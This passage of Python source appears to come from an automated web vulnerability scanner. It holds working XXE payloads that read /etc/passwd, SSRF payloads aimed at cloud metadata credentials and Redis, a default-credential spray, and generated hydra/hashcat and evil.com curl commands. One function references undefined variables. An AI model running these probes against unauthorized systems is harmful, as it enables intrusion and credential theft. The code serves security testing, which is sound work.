                     list(ep.params.keys())[0] if ep.params else "body"),
                ep, base_fp
            )
            # Only on registration/profile/comment endpoints
            if any(x in url_l for x in ["/register","/signup","/profile","/comment","/review","/post"]):
                findings += self.agentic._test_second_order_sqli(
                    next((k for k in ep.params if not k.startswith("header:")),
                         list(ep.params.keys())[0] if ep.params else "body"),
                    ep, base_fp
                )

        return findings

    def _csrf_check(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        if ep.method != "POST": return []
        r    = self.client.post(ep.url, data=ep.params)
        body = r.get("body","")
        csrf_pats = [
            r'name=["\']?(?:csrf|_token|csrfmiddlewaretoken|authenticity_token)["\']?\s+value=["\']?([^"\'>\s]+)',
        ]
        csrf_val = ""
        for p in csrf_pats:
            m = re.search(p, body, re.I)
            if m: csrf_val = m.group(1); break

        state_keys = ["update","delete","create","edit","change","modify","add","remove",
                      "password","settings","profile","admin","config","transfer"]
        if not csrf_val and any(k in ep.url.lower() for k in state_keys):
            return [Finding(
                owasp_id="A01", owasp_name="Broken Access Control",
                title=f"Missing CSRF Protection: {ep.url}",
                risk="High", confidence=75, url=ep.url, method="POST",
                param="csrf_token", payload="No CSRF token",
                evidence="State-changing POST endpoint lacks CSRF token",
                baseline_diff="csrf_check", tool_output="",
                request_raw=f"POST {ep.url}",
                response_raw=body[:200],
                exploit_cmd=f'<form method="POST" action="{ep.url}">...</form>',
                remediation="Add CSRF tokens to all state-changing forms.",
                tool="csrf_check",
            )]
        return []

    def _rate_limit_check(self, ep: Endpoint) -> List[Finding]:
        if not any(k in ep.url.lower() for k in ["/login","/auth","/signin","/reset"]):
            return []
        statuses = []
        for _ in range(12):
            r = self.client.post(ep.url, data={"username":"test","password":"wrong"})
            statuses.append(r["status"])
            time.sleep(0.08)
        if 429 not in statuses and 403 not in statuses and len(set(statuses)) <= 2:
            return [Finding(
                owasp_id="A04", owasp_name="Insecure Design",
                title=f"No Rate Limiting on Auth: {ep.url}",
                risk="High", confidence=80, url=ep.url, method="POST",
                param="rate_limit", payload="12 rapid requests",
                evidence=f"12 requests returned {set(statuses)} — no 429/block",
                baseline_diff="", tool_output=f"Statuses: {statuses}",
                request_raw=f"POST {ep.url} ×12",
                response_raw=f"Status codes: {statuses}",
                exploit_cmd=f"hydra -l admin -P rockyou.txt '{urllib.parse.urlparse(ep.url).netloc}' http-post-form",
                remediation="Implement rate limiting + CAPTCHA on auth endpoints.",
                tool="rate_check",
            )]
        return []

    def _jwt_check(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        jwt = self.client.session.jwt_token
        if not jwt: return []
        try:
            parts = jwt.split(".")
            if len(parts) != 3: return []
            hdr   = json.loads(base64.b64decode(parts[0]+"==").decode("utf-8",errors="ignore"))
            alg   = hdr.get("alg","").upper()
            if alg in ("NONE",""):
                return [Finding(
                    owasp_id="A07",owasp_name="Authentication Failures",
                    title="JWT alg:none — Signature Bypass",
                    risk="Critical",confidence=95,
                    url=ep.url,method="GET",param="Authorization",
                    payload=jwt[:40]+"...",
                    evidence=f"JWT uses alg:none — no signature verification",
                    baseline_diff="",tool_output="",
                    request_raw=f"Authorization: Bearer {jwt[:60]}...",response_raw="",
                    exploit_cmd='python3 -c "import base64,json; h=base64.b64encode(json.dumps({\'alg\':\'none\'}).encode()).rstrip(b\'=\').decode(); print(h+\'.\'+\'PAYLOAD.\'")',
                    remediation="Whitelist allowed JWT algorithms. Reject alg:none.",
                    tool="jwt_check",
                )]
            if alg.startswith("HS"):
                return [Finding(
                    owasp_id="A07",owasp_name="Authentication Failures",
                    title=f"JWT uses weak symmetric {alg}",
                    risk="Medium",confidence=65,
                    url=ep.url,method="GET",param="Authorization",payload=alg,
                    evidence=f"Symmetric JWT ({alg}): secret can be brute-forced",
                    baseline_diff="",tool_output="",
                    request_raw=f"Authorization: Bearer {jwt[:60]}...",response_raw="",
                    exploit_cmd=f"hashcat -a 0 -m 16500 '{jwt}' /usr/share/wordlists/rockyou.txt",
                    remediation="Use asymmetric RS256/ES256.",
                    tool="jwt_check",
                )]
        except Exception:
            pass
        return []

    def _xxe_probe(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        ]
        for p in payloads:
            r    = self.client.post(ep.url, data=p,
                                    extra_headers={"Content-Type":"application/xml"})
            body = r.get("body","")
            if ("root:" in body and "/bin/" in body) or "[extensions]" in body:
                return [Finding(
                    owasp_id="A03",owasp_name="Injection",
                    title=f"XXE Injection: {ep.url}",
                    risk="Critical",confidence=92,
                    url=ep.url,method="POST",param="body:xml",payload=p[:200],
                    evidence=f"File read via XXE: {body[:200]}",
                    baseline_diff="xxe_probe",tool_output=body[:400],
                    request_raw=f"POST {ep.url}\nContent-Type: application/xml\n\n{p[:200]}",
                    response_raw=body[:400],
                    exploit_cmd=f"curl -X POST -H 'Content-Type: application/xml' -d '{p[:200]}' '{ep.url}'",
                    remediation="Disable external entity processing.",
                    confirmed=True, tool="xxe_probe",
                )]
        return []

    def _deser_probe(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        """Check cookies for serialized objects."""
        for name, value in self.client.session.cookies.items():
            try:
                decoded = base64.b64decode(value+"==").decode("latin-1",errors="replace")
                if any(m in decoded for m in ["java.","O:","rO0","pickle","ACED"]):
                    return [Finding(
                        owasp_id="A08",owasp_name="Deserialization Failures",
                        title=f"Serialized Object in Cookie '{name}': {ep.url}",
                        risk="High",confidence=75,
                        url=ep.url,method="GET",param=f"cookie:{name}",payload=value[:100],
                        evidence=f"Cookie contains serialized object",
                        baseline_diff="deser_check",tool_output=decoded[:200],
                        request_raw=f"Cookie: {name}={value[:50]}...",response_raw="",
                        exploit_cmd="# Use ysoserial/phpggc to craft malicious serialized payload",
                        remediation="Use signed JWT or encrypted tokens instead of serialized objects.",
                        tool="deser_probe",
                    )]
            except Exception:
                pass
        return []

    def _cors_check(self, ep: Endpoint) -> List[Finding]:
        """Test CORS origin reflection."""
        r    = self.client.get(ep.url)
        hdrs = {k.lower():v for k,v in r.get("headers",{}).items()}
        acao = hdrs.get("access-control-allow-origin","")
        acac = hdrs.get("access-control-allow-credentials","")
        if not acao: return []
        if acao == "*": 
            return [Finding(
                owasp_id="A05",owasp_name="Security Misconfiguration",
                title=f"Wildcard CORS: {ep.url}",
                risk="Medium",confidence=85,
                url=ep.url,method="GET",param="CORS",payload="*",
                evidence="Access-Control-Allow-Origin: *",
                baseline_diff="cors_check",tool_output="",
                request_raw=f"GET {ep.url}",response_raw=f"ACAO: *",
                exploit_cmd=f"curl -H 'Origin: https://evil.com' '{ep.url}'",
                remediation="Whitelist specific trusted origins.",
                tool="cors_check",
            )]
        if acao and "true" in acac.lower():
            evil = "https://evil.attacker.com"
            r2   = self.client.get(ep.url, extra_headers={"Origin": evil})
            ref  = r2.get("headers",{}).get("access-control-allow-origin","")
            if evil in ref:
                return [Finding(
                    owasp_id="A05",owasp_name="Security Misconfiguration",
                    title=f"CORS Origin Reflection + Credentials: {ep.url}",
                    risk="High",confidence=92,
                    url=ep.url,method="GET",param="Origin",payload=evil,
                    evidence=f"Reflects arbitrary origin with credentials=true",
                    baseline_diff="cors_origin_reflect",tool_output=f"ACAO: {ref}",
                    request_raw=f"GET {ep.url}\nOrigin: {evil}",
                    response_raw=f"Access-Control-Allow-Origin: {ref}",
                    exploit_cmd=f"curl -H 'Origin: {evil}' -v '{ep.url}'",
                    remediation="Do not reflect arbitrary origins. Whitelist trusted domains only.",
                    confirmed=True, tool="cors_check",
                )]
        return []


    # ── A07: Username Discovery from target ──────────────────────────────────
    def _discover_usernames(self, login_url: str) -> list:
        """
        Target saytidan real username-larni topishga urinish.
        Manbalar: /api/users, /users, author pages, comments, emails.
        """
        found = []
        base  = login_url.rsplit("/",1)[0] if "/" in login_url else login_url

        # API endpoints
        api_paths = [
            "/api/users", "/api/v1/users", "/api/v2/users",
            "/users", "/members", "/authors", "/contributors",
            "/api/user/list", "/admin/users",
        ]
        for path in api_paths:
            r = self.client.get(base.rstrip("/") + path)
            if r.get("status") != 200: continue
            body = r.get("body","")
            try:
                data = json.loads(body)
                # username, login, email, name field-larini izlash
                def extract(obj, depth=0):
                    if depth > 4: return
                    if isinstance(obj, dict):
                        for k in ["username","login","user","name","email","handle"]:
                            if k in obj and isinstance(obj[k], str):
                                val = obj[k].split("@")[0]  # email-dan prefix
                                if 2 < len(val) < 50:
                                    found.append(val)
                        for v in obj.values():
                            extract(v, depth+1)
                    elif isinstance(obj, list):
                        for item in obj[:20]:
                            extract(item, depth+1)
                extract(data)
            except Exception:
                # HTML-dan username-larni regex bilan
                for m in re.finditer(
                    r'(?:username|author|by)["\s:>]+([a-zA-Z0-9_.-]{3,30})',
                    body, re.I
                ):
                    found.append(m.group(1))
            if found: break

        # Emaillardan username ajratish
        emails = re.findall(r'[a-zA-Z0-9._%+-]+(?=@)', " ".join(found))
        found.extend(emails)

        # Dedup va clean
        seen, clean = set(), []
        for u in found:
            u = u.strip().lower()
            if u and u not in seen and not any(
                x in u for x in ["example","test123","lorem","ipsum"]
            ):
                seen.add(u)
                clean.append(u)
        return clean[:10]

    # ── A07: Username Enumeration ────────────────────────────────────────────
    def _username_enum(self, ep: Endpoint) -> List[Finding]:
        """Login endpoint-da valid vs invalid username response farqini tekshirish."""
        url_l = ep.url.lower()
        auth_patterns = [
            "/login","/signin","/auth","/sign-in","/log-in",
            "/session","/token","/authenticate","/user/login",
            "/account/login","/api/login","/api/auth","/api/session",
        ]
        if not any(x in url_l for x in auth_patterns):
            return []

        # Real username-larni targetdan olishga urinish
        real_users = self._discover_usernames(ep.url)
        # Fallback: common usernames
        common_users = ["admin","administrator","user","test","root",
                        "info","support","webmaster","demo","guest"]
        test_users = (real_users + common_users)[:5] if real_users else common_users[:3]

        # Test pairs: (valid_candidate, wrong_pass) va (definitely_invalid, wrong_pass)
        invalid_user = "xXxNeverExistsUser99xXx"
        test_pairs = [(u, "wrongpassword_pentest_123") for u in test_users[:2]]
        test_pairs.append((invalid_user, "wrongpassword_pentest_123"))
        responses = []
        for uname, pwd in test_pairs:
            r = self.client.post(ep.url, data={"username": uname, "password": pwd})
            responses.append({
                "username": uname, "status": r.get("status",0),
                "size": len(r.get("body","")),
                "body_snippet": r.get("body","").lower()[:300],
                "timing": r.get("timing",0),
            })

        if len(responses) < 2: return []
        # Compare: valid candidate vs invalid user (last response)
        r_valid   = responses[0]   # common username like 'admin'
        r_invalid = responses[-1]  # definitely invalid username

        # Different status codes
        if r_valid["status"] != r_invalid["status"]:
            return [Finding(
                owasp_id="A07", owasp_name="Authentication Failures",
                title=f"Username Enumeration (status diff): {ep.url}",
                risk="Medium", confidence=80,
                url=ep.url, method="POST", param="username",
                payload=f"valid={test_pairs[1][0]}, invalid={test_pairs[0][0]}",
                evidence=f"Valid user: {r2['status']}, Invalid user: {r1['status']}",
                baseline_diff=f"{r1['status']} vs {r2['status']}",
                tool_output=f"r1={r1['body_snippet'][:100]}, r2={r2['body_snippet'][:100]}",
                request_raw=f"POST {ep.url}\nusername=admin vs username=invalid",
                response_raw=f"Status diff: {r1['status']} vs {r2['status']}",
                exploit_cmd=f"curl -X POST -d 'username=admin&password=wrong' '{ep.url}'",
                remediation="Return identical responses for valid and invalid usernames.",
                tool="username_enum",
            )]

        # Different body content (e.g. "user not found" vs "wrong password")
        not_found_sigs = ["user not found","no account","does not exist","unknown user"]
        wrong_pass_sigs = ["wrong password","invalid password","incorrect password"]
        r1_not_found = any(s in r1["body_snippet"] for s in not_found_sigs)
        r2_wrong_pass = any(s in r2["body_snippet"] for s in wrong_pass_sigs)

        if r1_not_found or r2_wrong_pass:
            return [Finding(
                owasp_id="A07", owasp_name="Authentication Failures",
                title=f"Username Enumeration (body diff): {ep.url}",
                risk="Medium", confidence=75,
                url=ep.url, method="POST", param="username",
                payload=f"valid={test_pairs[1][0]}, invalid={test_pairs[0][0]}",
                evidence=(f"Different error messages: "
                          f"{'user not found' if r1_not_found else ''} vs "
                          f"{'wrong password' if r2_wrong_pass else ''}"),
                baseline_diff="body_diff",
                tool_output=f"{r1['body_snippet'][:150]} | {r2['body_snippet'][:150]}",
                request_raw=f"POST {ep.url}\nusername=admin vs username=invalid",
                response_raw=f"{r1['body_snippet'][:200]}",
                exploit_cmd=f"# Use ffuf to enumerate usernames via response diff",
                remediation="Use generic error message: 'Invalid username or password'.",
                tool="username_enum",
            )]

        # Timing difference (>500ms)
        if abs(r1["timing"] - r2["timing"]) > 0.5:
            return [Finding(
                owasp_id="A07", owasp_name="Authentication Failures",
                title=f"Username Enumeration (timing): {ep.url}",
                risk="Low", confidence=60,
                url=ep.url, method="POST", param="username",
                payload=f"valid vs invalid username timing diff",
                evidence=f"Timing: valid={r2['timing']}s, invalid={r1['timing']}s (diff {abs(r1['timing']-r2['timing']):.2f}s)",
                baseline_diff="timing_diff",
                tool_output="", request_raw="", response_raw="",
                exploit_cmd="# Time-based username enumeration",
                remediation="Use constant-time comparison for username lookups.",
                tool="username_enum",
            )]
        return []

    # ── A05: Default Credentials ──────────────────────────────────────────────
    def _mini_credential_pairs(self, tech: dict) -> List[Tuple[str, str]]:
        """Small built-in credential spray for admin/login pages only."""
        tech = tech or {}
        framework = str(tech.get("framework") or "").lower()
        cms = str(tech.get("cms") or "").lower()
        seeded: List[Tuple[str, str]] = []
        if framework == "django":
            seeded.append(("admin", "admin"))
        if framework == "spring":
            seeded.append(("user", "user"))
        if cms == "wordpress":
            seeded.append(("admin", "admin"))
        pairs = seeded + [
            ("admin", "admin"),
            ("admin", "admin123"),
            ("admin", "password"),
            ("admin", "password123"),
            ("root", "root"),
            ("root", "toor"),
            ("user", "user"),
            ("user", "user123"),
            ("test", "test"),
            ("default", "default"),
            ("guest", "guest"),
            ("administrator", "administrator"),
        ]
        deduped: List[Tuple[str, str]] = []
        seen: Set[Tuple[str, str]] = set()
        for pair in pairs:
            if pair in seen:
                continue
            seen.add(pair)
            deduped.append(pair)
            if len(deduped) >= 12:
                break
        return deduped

    def _extract_login_csrf(self, body: str) -> str:
        for pattern in [
            r'<input[^>]+name=["\'](?:csrf[_-]?token|_token|csrfmiddlewaretoken|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
            r'"csrf_?[Tt]oken"\s*:\s*"([^"]+)"',
        ]:
            match = re.search(pattern, body or "", re.I)
            if match:
                return html_mod.unescape(match.group(1))
        return ""

    def _discover_login_form(self, html_body: str, url: str) -> dict:
        body = html_body or ""
        forms = re.findall(r"(<form\b[^>]*>.*?</form>)", body, re.I | re.S)
        candidates = forms or [body]
        for form_html in candidates:
            input_tags = re.findall(r"(<input\b[^>]*>)", form_html, re.I | re.S)
            if not input_tags:
                continue
            username_field = ""
            password_field = ""
            csrf_field = ""
            hidden_fields: Dict[str, str] = {}
            action_match = re.search(r"<form\b[^>]*action=[\"']([^\"']+)[\"']", form_html, re.I | re.S)
            action_url = urllib.parse.urljoin(url, action_match.group(1)) if action_match else url
            for tag in input_tags:
                name_match = re.search(r"\bname=[\"']([^\"']+)[\"']", tag, re.I)
                if not name_match:
                    continue
                name = html_mod.unescape(name_match.group(1))
                value_match = re.search(r"\bvalue=[\"']([^\"']*)[\"']", tag, re.I | re.S)
                value = html_mod.unescape(value_match.group(1)) if value_match else ""
                type_match = re.search(r"\btype=[\"']([^\"']+)[\"']", tag, re.I)
                input_type = (type_match.group(1).lower() if type_match else "text").strip()
                if input_type == "password" or re.search(r"(?:pass|passwd|pwd)", name, re.I):
                    password_field = password_field or name
                    continue
                if input_type in {"text", "email", "tel"} or re.search(r"(?:user|email|login)", name, re.I):
                    if not username_field and not re.search(r"(?:csrf|token)", name, re.I):
                        username_field = name
                if input_type == "hidden":
                    hidden_fields[name] = value
                    if re.search(r"(?:csrf|token|authenticity)", name, re.I):
                        csrf_field = csrf_field or name
            if password_field and username_field:
                csrf_value = self._extract_login_csrf(form_html)
                if csrf_field and csrf_value and not hidden_fields.get(csrf_field):
                    hidden_fields[csrf_field] = csrf_value
                return {
                    "username_field": username_field,
                    "password_field": password_field,
                    "csrf_field": csrf_field or "csrf_token",
                    "action_url": action_url,
                    "hidden_fields": hidden_fields,
                }

        fmap = self.ai.identify_login_fields(body[:4000], url) if self.ai else {}
        csrf_field = fmap.get("csrf_field", "csrf_token")
        hidden_fields: Dict[str, str] = {}
        csrf_value = self._extract_login_csrf(body)
        if csrf_value and csrf_field:
            hidden_fields[csrf_field] = csrf_value
        return {
            "username_field": fmap.get("username_field", "username"),
            "password_field": fmap.get("password_field", "password"),
            "csrf_field": csrf_field,
            "action_url": urllib.parse.urljoin(url, fmap.get("action_url") or url),
            "hidden_fields": hidden_fields,
        }

    def _response_signature(self, response: dict) -> Tuple[int, str, str]:
        body = str(response.get("body", ""))
        return (
            int(response.get("status", 0) or 0),
            str(response.get("url") or ""),
            hashlib.md5(body.encode("utf-8", errors="replace")).hexdigest(),
        )

    def _default_login_succeeded(
        self,
        response: dict,
        username: str,
        login_url: str,
        baseline: Optional[dict] = None,
    ) -> Tuple[bool, str]:
        if not response or response.get("status", 0) == 0:
            return False, "request failed"
        if baseline and self._response_signature(response) == self._response_signature(baseline):
            return False, "same as anonymous baseline"

        status = int(response.get("status", 0) or 0)
        final_url = str(response.get("url") or login_url)
        final_url_l = final_url.lower()
        body = str(response.get("body", ""))
        body_l = body.lower()
        username_l = username.lower()

        failure_markers = [
            "invalid", "failed", "wrong password", "incorrect", "unauthorized",
            "access denied", "login failed", "invalid credentials", "try again",
        ]
        success_markers = [
            "logout", "log out", "sign out", "dashboard", "welcome",
            "my account", "profile", "admin panel", "control panel",
            "manage users", "account settings",
        ]
        login_markers = [
            "type=\"password\"", "type='password'", "name=\"password\"",
            "name='password'", "forgot password", "sign in", "log in",
        ]

        if any(marker in body_l for marker in failure_markers):
            return False, "failure marker in response body"

        if status in (301, 302, 303, 307, 308):
            location = str(response.get("headers", {}).get("location", ""))
            if location and not any(x in location.lower() for x in ["/login", "/signin", "/auth", "/error"]):
                return True, f"redirected to {location}"

        moved_away = (
            final_url.rstrip("/").lower() != login_url.rstrip("/").lower()
            and not any(x in final_url_l for x in ["/login", "/signin", "/auth"])
        )
        if moved_away and status in (200, 201, 204):
            return True, f"landed on {final_url}"

        has_success_marker = any(marker in body_l for marker in success_markers)
        has_identity_marker = username_l and username_l in body_l and any(
            marker in body_l for marker in ["logout", "profile", "dashboard", "welcome", "account"]
        )
        still_login_like = any(marker in body_l for marker in login_markers)
        if status in (200, 201, 204) and (has_success_marker or has_identity_marker) and not still_login_like:
            return True, "post-login markers in response body"

        return False, "no reliable login success indicator"

    def _attempt_default_form_login(
        self,
        login_url: str,
        username: str,
        password: str,
        form_spec: Optional[dict] = None,
    ) -> Tuple[dict, dict]:
        session = SessionContext()
        client = HTTPClient(session)
        probe = client.get(login_url)
        if probe.get("status", 0) == 0:
            return probe, {"action_url": login_url, "payload": {}}

        active_url = str(probe.get("url") or login_url)
        spec = form_spec or self._discover_login_form(probe.get("body", ""), active_url)
        payload = dict(spec.get("hidden_fields") or {})
        csrf_field = spec.get("csrf_field") or "csrf_token"
        csrf_value = self._extract_login_csrf(probe.get("body", ""))
        if csrf_value and csrf_field and not payload.get(csrf_field):
            payload[csrf_field] = csrf_value
        payload[spec.get("username_field") or "username"] = username
        payload[spec.get("password_field") or "password"] = password
        action_url = urllib.parse.urljoin(active_url, spec.get("action_url") or active_url)
        response = client.post(action_url, data=payload)
        return response, {"action_url": action_url, "payload": payload}

    def _default_creds(self, ep: Endpoint) -> List[Finding]:
        """Small built-in credential spray for admin/login pages."""
        if not any(x in ep.url.lower() for x in ["/login", "/signin", "/admin", "/auth"]):
            return []

        tech = self.ctx.site_tech or {}
        creds = self._mini_credential_pairs(tech)
        anonymous_probe = HTTPClient(SessionContext()).get(ep.url)
        form_spec = self._discover_login_form(
            anonymous_probe.get("body", ""),
            str(anonymous_probe.get("url") or ep.url),
        )

        for username, password in creds:
            payload_tag = f"{username}:{password}"
            if self.ctx.already_tested(ep.url, "POST", "default_creds", payload_tag):
                continue

            form_response, form_meta = self._attempt_default_form_login(
                ep.url, username, password, form_spec=form_spec
            )
            form_ok, form_reason = self._default_login_succeeded(
                form_response, username, ep.url, baseline=anonymous_probe
            )
            if form_ok:
                action_url = form_meta.get("action_url", ep.url)
                encoded_payload = urllib.parse.urlencode(form_meta.get("payload", {}))
                return [Finding(
                    owasp_id="A07", owasp_name="Authentication Failures",
                    title=f"Default Credentials: {username}/{password} on {ep.url}",
                    risk="Critical", confidence=95,
                    url=ep.url, method="POST", param="username/password",
                    payload=payload_tag,
                    evidence=f"Mini credential spray succeeded via login form: {form_reason}",
                    baseline_diff="login_success",
                    tool_output=f"Action URL: {action_url}\nFinal URL: {form_response.get('url', ep.url)}",
                    request_raw=f"POST {action_url}\n{encoded_payload}",
                    response_raw=form_response.get("body", "")[:300],
                    exploit_cmd=f"curl -X POST -d '{encoded_payload}' '{action_url}'",
                    remediation="Change all default credentials immediately.",
                    confirmed=True, tool="default_creds",
                )]

            basic_session = SessionContext()
            basic_client = HTTPClient(basic_session)
            basic = base64.b64encode(f"{username}:{password}".encode()).decode()
            basic_response = basic_client.get(
                ep.url,
                extra_headers={"Authorization": f"Basic {basic}"},
            )
            basic_ok, basic_reason = self._default_login_succeeded(
                basic_response, username, ep.url, baseline=anonymous_probe
            )
            if basic_ok:
                return [Finding(
                    owasp_id="A07", owasp_name="Authentication Failures",
                    title=f"Default Credentials: {username}/{password} on {ep.url}",
                    risk="Critical", confidence=94,
                    url=ep.url, method="GET", param="Authorization",
                    payload=payload_tag,
                    evidence=f"Mini credential spray succeeded via HTTP Basic auth: {basic_reason}",
                    baseline_diff="login_success",
                    tool_output=f"Final URL: {basic_response.get('url', ep.url)}",
                    request_raw=f"GET {ep.url}\nAuthorization: Basic {basic}",
                    response_raw=basic_response.get("body", "")[:300],
                    exploit_cmd=f"curl -H 'Authorization: Basic {basic}' '{ep.url}'",
                    remediation="Change all default credentials immediately.",
                    confirmed=True, tool="default_creds",
                )]
        return []

    # ── A05: Debug Mode Detection ─────────────────────────────────────────────
    def _debug_mode(self, ep: Endpoint) -> List[Finding]:
        """Flask/Django/Spring debug mode, stack traces, verbose errors."""
        findings = []
        url_l = ep.url.lower()

        # Probe debug-specific paths
        base = ep.url.rstrip("/").rsplit("/",1)[0] if "/" in ep.url else ep.url
        debug_paths = [
            f"{base}/debug",
            f"{base}/console",
            f"{base}/debugger",
        ]
        for dp in debug_paths:
            r = self.client.get(dp)
            body_l = r.get("body","").lower()
            if r.get("status") == 200 and any(x in body_l for x in
                ["interactive console","werkzeug debugger","debug console",
                 "python debugger","traceback","console.readLine"]):
                findings.append(Finding(
                    owasp_id="A05", owasp_name="Security Misconfiguration",
                    title=f"Debug Console Exposed: {dp}",
                    risk="Critical", confidence=92,
                    url=dp, method="GET", param="URL_PATH", payload="",
                    evidence=f"Interactive debug console accessible at {dp}",
                    baseline_diff="debug_exposed",
                    tool_output=r.get("body","")[:400],
                    request_raw=f"GET {dp}", response_raw=r.get("body","")[:400],
                    exploit_cmd=f"curl '{dp}'  # RCE via Werkzeug console",
                    remediation="Disable debug mode in production. Set DEBUG=False.",
                    confirmed=True, tool="debug_check",
                ))

        # Check current endpoint for stack traces in error response
        r = self.client.get(ep.url + "?crash=1&debug=1&test=<invalid>")
        body = r.get("body","")
        body_l = body.lower()
        stack_indicators = [
            "traceback (most recent call last)" in body_l,  # Python
            "at " in body_l and ".java:" in body_l,          # Java stack trace
            "system.web.httpunhandledexception" in body_l,   # ASP.NET
            "fatal error" in body_l and "stack trace" in body_l,
            "debug_backtrace" in body_l,                      # PHP
            "exception in thread" in body_l,                  # Java
        ]
        if any(stack_indicators):
            findings.append(Finding(
                owasp_id="A05", owasp_name="Security Misconfiguration",
                title=f"Stack Trace Exposed: {ep.url}",
                risk="Medium", confidence=85,
                url=ep.url, method="GET", param="URL_PATH", payload="?crash=1",
                evidence=f"Stack trace visible in error response",
                baseline_diff="stack_trace",
                tool_output=body[:400],
                request_raw=f"GET {ep.url}?crash=1&debug=1",
                response_raw=body[:400],
                exploit_cmd=f"curl '{ep.url}?crash=1'",
                remediation="Disable debug mode. Use custom error pages. Never show stack traces.",
                tool="debug_check",
            ))
        return findings

    # ── A02: Sensitive Data Exposure ──────────────────────────────────────────
    def _sensitive_data_exposure(self, ep: Endpoint) -> List[Finding]:
        """Response-da cleartext passwords, API keys, tokens bormi."""
        r    = self.client.get(ep.url) if ep.method == "GET"                else self.client.post(ep.url, data=ep.params)
        body = r.get("body","")
        if not body: return []

        findings = []

        # Check for sensitive patterns in response
        patterns = {
            "password_cleartext": [
                r'"password"\s*:\s*"([^"]{4,})"',
                r'"passwd"\s*:\s*"([^"]{4,})"',
            ],
            "api_key": [
                r'"api_?key"\s*:\s*"([a-zA-Z0-9_\-]{16,})"',
                r'"secret"\s*:\s*"([a-zA-Z0-9_\-]{16,})"',
                r'"token"\s*:\s*"([a-zA-Z0-9_\-\.]{20,})"',
            ],
            "aws_key": [
                r"AKIA[0-9A-Z]{16}",
                r'"aws_secret"\s*:\s*"([^"]{20,})"',
            ],
            "private_key": [
                r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
                r"-----BEGIN OPENSSH PRIVATE KEY-----",
            ],
            "db_connection": [
                r"(?:mysql|postgres|mongodb|redis)://[^\s<>]{10,}",
                r'"database_url"\s*:\s*"([^"]{10,})"',
            ],
        }

        for category, pats in patterns.items():
            for pat in pats:
                m = re.search(pat, body, re.I)
                if m:
                    found_val = m.group(1) if m.lastindex else m.group(0)
                    findings.append(Finding(
                        owasp_id="A02", owasp_name="Cryptographic Failures",
                        title=f"Sensitive Data Exposed ({category}): {ep.url}",
                        risk="Critical" if category in ("aws_key","private_key") else "High",
                        confidence=88,
                        url=ep.url, method=ep.method, param="response_body",
                        payload="",
                        evidence=f"{category} found: {found_val[:50]}...",
                        baseline_diff="sensitive_data",
                        tool_output=body[:400],
                        request_raw=f"{ep.method} {ep.url}",
                        response_raw=body[:400],
                        exploit_cmd=f"curl '{ep.url}' | grep -E '{pat[:40]}'",
                        remediation="Never expose credentials in API responses. Use environment variables.",
                        confirmed=True, tool="sensitive_data",
                    ))
                    self._print_finding(findings[-1])
                    break  # one per category

        # Check for weak hashing patterns (MD5 hashes)
        md5_pat = re.findall(r'"(?:password_hash|passwd|pwd)"\s*:\s*"([a-f0-9]{32})"', body, re.I)
        if md5_pat:
            findings.append(Finding(
                owasp_id="A02", owasp_name="Cryptographic Failures",
                title=f"MD5 Password Hash Exposed: {ep.url}",
                risk="High", confidence=80,
                url=ep.url, method=ep.method, param="response_body",
                payload="",
                evidence=f"MD5 hash in response: {md5_pat[0]}",
                baseline_diff="weak_hash",
                tool_output=body[:300],
                request_raw=f"{ep.method} {ep.url}",
                response_raw=body[:300],
                exploit_cmd=f"hashcat -m 0 '{md5_pat[0]}' /usr/share/wordlists/rockyou.txt",
                remediation="Use bcrypt/argon2 for password hashing. Never expose hashes.",
                tool="sensitive_data",
            ))
        return findings

    # ── A10: SSRF Extended ────────────────────────────────────────────────────
    def _ssrf_extended(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        """
        Extended SSRF: cloud metadata + IP encoding bypass + protocol smuggling.
        Complements the existing _test_ssrf in AgenticFuzzEngine.
        """
        ssrf_params = {
            "url","redirect","next","return","callback","dest","target",
            "src","load","fetch","uri","link","href","proxy","endpoint",
        }
        relevant = [k for k in ep.params
                    if k.split(":")[-1].lower() in ssrf_params]
        if not relevant: return []

        findings = []
        payloads = [
            # IP encoding bypasses
            ("ip_hex",      "http://0x7f000001/"),
            ("ip_decimal",  "http://2130706433/"),
            ("ip_short",    "http://127.1/"),
            ("ip_ipv6",     "http://[::1]/"),
            ("ip_octal",    "http://0177.0.0.1/"),
            # Cloud metadata
            ("aws_meta",    "http://169.254.169.254/latest/meta-data/"),
            ("aws_creds",   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("gcp_meta",    "http://metadata.google.internal/computeMetadata/v1/"),
            ("azure_meta",  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("do_meta",     "http://169.254.169.254/metadata/v1/"),
            # Protocol smuggling
            ("dict",        "dict://127.0.0.1:6379/info"),
            ("gopher",      "gopher://127.0.0.1:6379/_INFO"),
            ("ftp",         "ftp://127.0.0.1:21/"),
        ]

        for param in relevant[:3]:
            for name, payload in payloads:
                if self.ctx.already_tested(ep.url, ep.method, param, payload): continue
                resp = self.agentic._fuzz_request(ep, param, payload)
                body = resp.get("body","").lower()
                status = resp.get("status",0)

                confirmed_ssrf = (
                    ("ami-id" in body or "instance-id" in body or
                     "iam" in body and "role" in body),                    # AWS
                    ("computemetadata" in body or "service-accounts" in body),  # GCP
                    ("compute" in body and "location" in body),            # Azure
                    ("root:" in body and "/bin/" in body),                 # file
                    ("+PONG" in resp.get("body","") or                     # Redis
                     "redis_version" in body),
                    ("220" in resp.get("body","")[:10] and "ftp" in name), # FTP banner
                    (status == 200 and len(body) > 200 and               # Generic
                     any(x in body for x in ["localhost","internal","private","127"])),
                )
                if any(confirmed_ssrf):
                    risk = "Critical" if "aws_creds" in name or "gcp" in name else "High"
                    f = Finding(
                        owasp_id="A10", owasp_name="SSRF",
                        title=f"SSRF [{name}]: {ep.url} param={param.split(':')[-1]}",
                        risk=risk, confidence=90,
